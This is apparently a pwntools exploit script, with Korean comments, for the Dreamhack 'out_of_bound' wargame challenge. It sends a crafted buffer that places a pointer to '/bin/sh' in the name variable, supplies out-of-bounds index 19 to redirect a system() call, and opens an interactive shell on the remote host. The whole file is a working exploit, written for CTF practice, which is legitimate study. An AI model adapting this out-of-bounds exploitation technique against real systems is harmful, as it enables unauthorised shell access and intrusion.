from pwn import *

p = remote('host3.dreamhack.games', 16831)
e = ELF('./out_of_bound')


# name이 위치한 주소를 찾는다. -> 0x804a0ac
# 그냥 "/bin/sh"를 넣으면 디버깅 겨로가 인자로 "/bin"만 들어간다.
# system 함수가 공유 라이브러리 함수라 인자로 들어오는 변수 주소와 변수 값이 같이 들어와야 한다고 한다...
# 따라서 name+4의 주소와 "/bin/sh"를 입력으로 줘야한다. 왜냐하면 "/bin/sh"는 궁극적으로 name주소에서 4번째에 있으니까!
name = p32(0x804a0ac + 4) + b'/bin/sh\x00'
p.sendafter(b'name: ', name)

p.sendlineafter(b'want?: ', str(19).encode())

p.interactive()